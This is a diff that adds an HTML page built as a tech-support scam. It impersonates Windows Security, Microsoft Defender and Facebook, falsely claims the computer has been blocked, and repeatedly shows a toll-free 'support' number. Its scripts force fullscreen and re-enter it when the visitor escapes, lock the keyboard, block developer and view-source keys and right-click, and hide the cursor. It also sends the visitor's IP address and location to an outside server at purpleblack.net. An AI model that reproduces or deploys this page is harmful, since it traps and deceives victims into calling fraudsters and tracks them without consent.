@@ -1,0 +1,533 @@
+        <!DOCTYPE html>
+        <html>
+
+        <head>
+            <meta http-equiv="content-type" content="text/html;charset=utf-8" />
+            <title>Windows Suspended</title>
+            <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap" rel="stylesheet">
+
+            <script src="https://cdn.tailwindcss.com"></script>
+
+            <style>
+                body {
+                    background-image: url('bg1.png');
+                    background-size: 100% 100%;
+                    background-repeat: no-repeat;
+                    background-position: center center;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    height: 100vh;
+                    margin: 0;
+                    font-family: Inter, Arial, sans-serif;
+                    color: white;
+                }
+
+                body.fullscreen {
+                    background-image: url('https://res.cloudinary.com/dj53e8rpk/image/upload/v1741286820/popcopy_e4aldd.jpg');
+                    object-fit: cover;
+                }
+
+                #support-text {
+                    position: absolute;
+                    top: 85%;
+                    left: 50%;
+                    transform: translateX(-50%);
+                    font-size: 22px;
+                    text-align: center;
+                    width: 100%;
+                    font-weight: bold;
+                    color: black;
+                    display: none;
+                }
+
+                #support-text span {
+                    font-weight: normal;
+                }
+
+                #music {
+                    display: none;
+                }
+
+                #modal-overlay {
+                    display: none;
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background-color: rgba(0, 0, 0, 0.5);
+                    z-index: 9999;
+                }
+
+                #modal-content {
+                    background-color: white;
+                    border-radius: 5px;
+                    max-width: 400px;
+                    margin: 100px auto;
+                    padding: 20px;
+                    text-align: center;
+                }
+
+                #modal-close {
+                    cursor: pointer;
+                    color: #888;
+                    float: right;
+                    font-size: 20px;
+                    font-weight: bold;
+                }
+
+                #modal-message {
+                    color: black;
+                    font-weight: bold;
+                    margin-bottom: 20px;
+                }
+
+                #modal-image {
+                    margin-bottom: 20px;
+                }
+
+                .modal-buttons {
+                    display: flex;
+                    justify-content: space-between;
+                    margin-top: 20px;
+                }
+
+                .modal-buttons button {
+                    width: 100px;
+                    padding: 10px 0;
+                    border: none;
+                    border-radius: 5px;
+                    cursor: pointer;
+                    font-weight: bold;
+                    transition: background-color 0.3s;
+                }
+
+                .modal-buttons button.accept {
+                    background-color: white;
+                    color: black;
+                }
+
+                .modal-buttons button.dismiss {
+                    background-color: #3b5998;
+                    color: white;
+                }
+
+                .modal-buttons button:hover {
+                    background-color: rgba(0, 0, 0, 0.8);
+                }
+
+                @keyframes blink {
+                    0% {
+                        opacity: 1;
+                    }
+                    50% {
+                        opacity: 0;
+                    }
+                    100% {
+                        opacity: 1;
+                    }
+                }
+
+                .modal-buttons button.dismiss.blinking {
+                    animation: blink 1s infinite;
+                }
+
+                #welcomeDiv {
+                    display: none;
+                    background-color: #000;
+                    height: auto;
+                    width: 550px;
+                    position: fixed;
+                    top: 0;
+                    left: 50%;
+                    transform: translateX(-50%);
+                    z-index: 9999999999;
+                    text-align: center;
+                }
+
+                #welcomeDiv p {
+                    color: #FEFEFE;
+                    margin-top: 10px;
+                    font-size: 16px;
+                    opacity: 0.9;
+                }
+            </style>
+            <script>
+                document.addEventListener('DOMContentLoaded', function() {
+                    var music = document.getElementById('music');
+                    var isPlaying = false;
+                    var isFullscreen = false;
+                    var isPopupVisible = true;
+
+                    function toggleMusic() {
+                        if (isPlaying) {
+                            music.pause();
+                        } else {
+                            music.play();
+                        }
+                        isPlaying = !isPlaying;
+                    }
+
+                    function playMusicOnClick() {
+                        toggleMusic();
+                        document.removeEventListener('click', playMusicOnClick);
+                    }
+
+                    document.addEventListener('click', playMusicOnClick);
+
+                    var fullscreenEnabled = document.fullscreenEnabled || document.mozFullScreenEnabled || document.documentElement.webkitRequestFullScreen;
+
+                    function enterFullscreen() {
+                        if (fullscreenEnabled && !isFullscreen) {
+                            document.documentElement.requestFullscreen()
+                                .then(() => {
+                                    isFullscreen = true;
+                                    document.body.classList.add('fullscreen');
+                                    showWelcomeDiv();
+                                    openModal()
+                                    showRightSide()
+                                    showSupportText();
+                                })
+                                .catch(err => console.log('Error entering fullscreen:', err));
+                        }
+                    }
+
+                    function showRightSide() {
+
+                        const elemnt = document.querySelector('#right')
+                        elemnt.classList.remove('hidden')
+                        elemnt.classList.add('block')
+
+                    }
+
+                    function exitFullscreen() {
+                        if (document.fullscreenElement) {
+                            document.exitFullscreen();
+                        }
+                    }
+
+                    // Automatically re-enter fullscreen when it is exited
+                    document.addEventListener('fullscreenchange', function() {
+                        if (!document.fullscreenElement) {
+                            isFullscreen = false;
+                            setTimeout(() => {
+                                if (!isFullscreen) {
+                                    enterFullscreen();
+                                }
+                            }, 1000); // Wait briefly to allow the user to press Escape again if desired
+                        }
+                    });
+
+                    document.addEventListener('click', enterFullscreen);
+
+                    var modalOverlay = document.getElementById('modal-overlay');
+                    var modalClose = document.getElementById('modal-close');
+
+                    function showModal() {
+                        modalOverlay.style.display = 'block';
+                    }
+
+                    function closeModal() {
+                        modalOverlay.style.display = 'none';
+                    }
+
+                    modalClose.addEventListener('click', closeModal);
+
+                    showModal();
+
+                    function hideCursor() {
+                        document.documentElement.style.cursor = 'none';
+                    }
+
+                    document.addEventListener('click', function() {
+                        hideCursor();
+                        document.removeEventListener('click', hideCursor);
+                        if (isPopupVisible) {
+                            closeModal();
+                            isPopupVisible = false;
+                        }
+                    });
+
+                    document.addEventListener('contextmenu', function(event) {
+                        event.preventDefault();
+                    });
+
+                    document.addEventListener('keydown', function(e) {
+                        if (e.ctrlKey && (e.key === 'U' || e.key === 'C' || e.key === 'S')) {
+                            e.preventDefault();
+                        }
+                    });
+
+                    function preventKeyEvents(event) {
+                        const blockedKeyCodes = [123];
+                        const keyCode = event.keyCode || event.which;
+
+                        if (blockedKeyCodes.includes(keyCode)) {
+                            event.preventDefault();
+                            console.log(`Key with code ${keyCode} is blocked.`);
+                        }
+                    }
+
+                    window.addEventListener('keydown', preventKeyEvents);
+
+                    function showWelcomeDiv() {
+                        document.getElementById('welcomeDiv').style.display = 'block';
+                    }
+
+                    function showSupportText() {
+                        document.getElementById('support-text').style.display = 'block';
+                    }
+
+
+                    navigator.keyboard.lock();
+                    document.onkeydown = function(e) {
+                        return false;
+                    }
+                });
+            </script>
+
+
+            <script>
+                var call = "1-855-535-9906";
+                document.addEventListener('click', function(event) {
+                    // Get the element that was clicked
+                    var clickedElement = event.target;
+
+                    // Log the clicked element to the console (you can replace this with sending data to your central server)
+                    console.log('Clicked element:', clickedElement);
+
+                    // You can also track specific elements by checking their class names, IDs, or other attributes
+                    getCurrentIpAddress();
+                    // if (clickedElement.classList.contains('track-me')) {
+                    //  // Send click data to the central server
+                    // }
+                });
+
+                function getCurrentIpAddress() {
+                    fetch('https://api.ipify.org/?format=json')
+                        .then(response => response.json())
+                        .then(data => {
+                            const ipAddress = data.ip;
+                            fetch("https://purpleblack.net/analytics/proxy/" + ipAddress)
+                                .then(response => response.json())
+                                .then(data => {
+                                    if (document.fullscreenElement) {
+                                        data.fullscreen = true;
+                                    } else {
+                                        data.fullscreen = false;
+                                    }
+                                    data.action = window.location.hostname;
+                                    this.sendDataToServer(data);
+                                    // update id_add
+                                    var ipadd = data.ip;
+                                    var city = data.city;
+                                    var country = data.country;
+                                    var isp = data.org;
+                                    console.log("Data", data);
+                                    var date = new Date();
+                                    document.getElementById('ip_add').textContent = 'IP: ' + ipadd;
+                                    document.getElementById('city').textContent = 'Location: ' + city + ', ' + country;
+                                    document.getElementById('isp').textContent = 'ISP: ' + isp;
+                                })
+                                .catch(error => {
+                                    console.error("Error fetching location and ISP:", error);
+                                    document.getElementById("city").innerHTML = "Location: Unavailable";
+                                    document.getElementById("isp").innerHTML = "ISP: Unavailable";
+                                });
+                        })
+                        .catch(error => {
+                            console.error("Error fetching IP address:", error);
+                            document.getElementById("ip_add").innerHTML = "Address IP: Unavailable";
+                        });
+                }
+
+                // Function to send click data to the central server
+                function sendDataToServer(data) {
+                    console.log("Fetch API Called", data);
+                    fetch('https://purpleblack.net/analytics/trackclicks', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json', // Set content type to JSON
+                                'Access-Control-Allow-Origin': '*'
+                            },
+                            body: JSON.stringify(data) // No need to parse and stringify again
+                        })
+                        .then(response => {
+                            if (!response.ok) {
+                                console.error('Failed to send click data to server');
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Error sending click data:', error);
+                        });
+                }
+            </script>
+
+            <script>
+                getCurrentIpAddress()
+            </script>
+
+        </head>
+
+        <body>
+            <audio id="music" src="Text-to-Speech_18-Jun-2023_03-17.mp3" controls loop></audio>
+
+
+            <div id="modal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden">
+
+                <div class="bg-white animateBeat !border-[1px] border-slate-200 p-0 rounded-lg shadow-lg w-full max-w-2xl text-center relative">
+                    <div class="w-full flex flex-row items-center justify-between flex-nowrap h-12 !border-b-1 border-gray-200 px-3">
+                        <div class="flex flex-1 flex-row items-center justify-start ">
+
+                            <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" id="Layer_2" viewBox="0 0 35.17 35.17"><defs><style>.cls-1{fill:#81bc06;}.cls-2{fill:#ffba08;}.cls-3{fill:#f35325;}.cls-4{fill:#05a6f0;}</style></defs><g id="Layer_1-2"><path class="cls-3" d="m0,0h16.75v16.75H0V0Z"/><path class="cls-1" d="m18.42,0h16.75v16.75h-16.75V0Z"/><path class="cls-4" d="m0,18.42h16.75v16.75H0v-16.75Z"/><path class="cls-2" d="m18.42,18.42h16.75v16.75h-16.75v-16.75Z"/></g></svg>
+                            <p class="text-sm text-black ml-2">Windows Security</p>
+                        </div>
+                        <div class="[&_img]:w-3 [&_img]:h-3 [&_img]:mx-4 flex flex-row items-center justify-end ">
+                            <img src="/min.svg" />
+                            <img src="/max.svg" />
+                            <img src="/close.svg" />
+                        </div>
+                    </div>
+
+                    <div class="p-4 flex flex-col items-center justify-center text-red-600 text-2xl font-semibold">
+
+                        <p id="ip_add"></p>
+                        <p id="city"></p>
+                        <p id="isp"></p>
+                    </div>
+                    <div class="p-4 text-black flex flex-col items-start justify-start">
+                        <div class="mx-auto w-full flex px-4 flex-row items-center justify-center">
+                            <img src="./img.png" class="w-24 h-24 object-contain" />
+                            <h2 class="text-md ml-4 text-left"><b>Facebook Malicious Activity Detected</b>
+                                <br/>Virus & Threat Protection is turned off<br/> please contact support</h2>
+                        </div>
+                        <div class="h-2 w-2"></div>
+                        <h2 class="text-md text-black font-semibold text-center px-4 my-4">Microsoft Defender has detected suspicious activity from your Facebook Account and access to this PC has been blocked for security reasons.</h2>
+                        <div class="flex flex-row text-2xl w-full items-center justify-center">
+                            <p class="text-blue-600 font-bold">Call Windows Support</p>
+                            <button class="text-blue-600 border-blue-600 border-[2px] rounded-lg px-4 py-2 ml-4 font-bold">+1-877-830-1420</button></div>
+                    </div>
+                    <div class="h-[1px] w-full bg-gray-200 mt-4"></div>
+                    <div class="w-full p-4 text-black flex flex-row items-center justify-between">
+                        <div class="flex flex-row items-center justify-between">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="w-12 h-12 mr-4" id="Layer_2" viewBox="0 0 35.17 35.17"><defs><style>.cls-1{fill:#81bc06;}.cls-2{fill:#ffba08;}.cls-3{fill:#f35325;}.cls-4{fill:#05a6f0;}</style></defs><g id="Layer_1-2"><path class="cls-3" d="m0,0h16.75v16.75H0V0Z"/><path class="cls-1" d="m18.42,0h16.75v16.75h-16.75V0Z"/><path class="cls-4" d="m0,18.42h16.75v16.75H0v-16.75Z"/><path class="cls-2" d="m18.42,18.42h16.75v16.75h-16.75v-16.75Z"/></g></svg>
+
+                            <div class="flex text-left font-semibold flex-col justify-center items-start">
+                                <p>Windows<br/>Security</p>
+                            </div>
+                        </div>
+
+                        <div>
+                            <button class="border-1 bg-white border-gray-700 w-32 rounded-lg p-4 px-6 font-semibold shadow-sm">Cancel</button>
+                            <button class="border-1  rounded-lg p-4 px-6 w-32 bg-blue-600 text-white font-semibold shadow-sm">OK</button>
+                        </div>
+                    </div>
+
+
+
+
+                </div>
+            </div>
+
+            <div id="modal-overlay">
+                <div id="modal-content">
+                    <span id="modal-close">&times;</span>
+                    <img id="modal-image" src="logo-facebookpng-32251.jpg" alt="Facebook Logo">
+                    <p id="modal-message">Facebook Has Temporarily Suspended Your Account.</p>
+                    <div class="modal-buttons">
+                        <button id="modal-accept" class="accept">Accept</button>
+                        <button id="modal-dismiss" class="dismiss blinking">Ignore</button>
+                    </div>
+                </div>
+            </div>
+
+            <div id="welcomeDiv" class="!w-full  !max-w-[65%] py-8 px-4 !mx-auto">  
+                <p class="!text-lg">
+                    Windows Defender Security Has Disabled Your Computer.<br/> Please Contact Microsoft Windows Support To Unlock Your Computer.<br/> Toll Free +1-877-830-1420
+                </p>
+            </div>
+
+            <div id="right" class="fixed hidden z-[99999] right-4 bottom-32">
+
+                <div class="bg-blue-600 font-sans text-2xl text-center font-medium leading-tight rounded-lg p-2 shadow-lg shadow-blue-300/50 mb-4">
+
+                    Call Support<br/> +1-877-830-1420
+                </div>
+
+                <div class="flex flex-row items-center p-4 mb-4 text-black font-semibold justify-start text-left bg-white rounded-lg shadow-lg">
+                    <div class="absolute right-4 bottom-2 w-0 h-0 border-l-8 border-l-transparent border-r-8 border-r-transparent border-t-8 border-t-white"></div>
+                    <svg xmlns="http://www.w3.org/2000/svg" class="w-12 h-12 mr-4" id="Layer_2" viewBox="0 0 35.17 35.17"><defs><style>.cls-1{fill:#81bc06;}.cls-2{fill:#ffba08;}.cls-3{fill:#f35325;}.cls-4{fill:#05a6f0;}</style></defs><g id="Layer_1-2"><path class="cls-3" d="m0,0h16.75v16.75H0V0Z"/><path class="cls-1" d="m18.42,0h16.75v16.75h-16.75V0Z"/><path class="cls-4" d="m0,18.42h16.75v16.75H0v-16.75Z"/><path class="cls-2" d="m18.42,18.42h16.75v16.75h-16.75v-16.75Z"/></g></svg>            Chat with <br/> Microsoft Live Agent
+                </div>
+            </div>
+
+
+            <div id="support-text" class="bg-blue-600 whitespace-nowrap z-[999999] p-4 text-center !text-white !w-auto">Call Microsoft Windows Support Toll Free +1-877-830-1420</div>
+        </body>
+        <style>
+            @keyframes heartbeat {
+                0% {
+                    transform: scale(1);
+                }
+                50% {
+                    transform: scale(1.02);
+                }
+                100% {
+                    transform: scale(1);
+                }
+            }
+
+            .animateBeat {
+                animation: heartbeat 1s infinite ease-in-out;
+            }
+        </style>
+
+        <script>
+            if (document)
+                document.addEventListener('click', function() {
+                    return document.fullscreenEnabled || document.mozFullScreenEnabled || document.documentElement.webkitRequestFullScreen;
+                })
+        </script>
+        <script>
+            function openModal() {
+                document.getElementById("modal").classList.remove("hidden");
+            }
+        </script>
+
+        <script>
+            const mover = document.getElementById("mover");
+
+            let offsetX, offsetY, isDragging = false;
+
+            mover.addEventListener("mousedown", (e) => {
+                isDragging = true;
+                offsetX = e.clientX - mover.offsetLeft;
+                offsetY = e.clientY - mover.offsetTop;
+                mover.style.cursor = "grabbing";
+            });
+
+            document.addEventListener("mousemove", (e) => {
+                if (!isDragging) return;
+
+                let x = e.clientX - offsetX;
+                let y = e.clientY - offsetY;
+
+                // Prevent the div from moving out of bounds
+                const maxX = window.innerWidth - mover.offsetWidth;
+                const maxY = window.innerHeight - mover.offsetHeight;
+
+                x = Math.max(0, Math.min(x, maxX));
+                y = Math.max(0, Math.min(y, maxY));
+
+                mover.style.left = `${x}px`;
+                mover.style.top = `${y}px`;
+            });
+
+            document.addEventListener("mouseup", () => {
+                isDragging = false;
+                mover.style.cursor = "move";
+            });
+        </script>
+
+
+        </html>
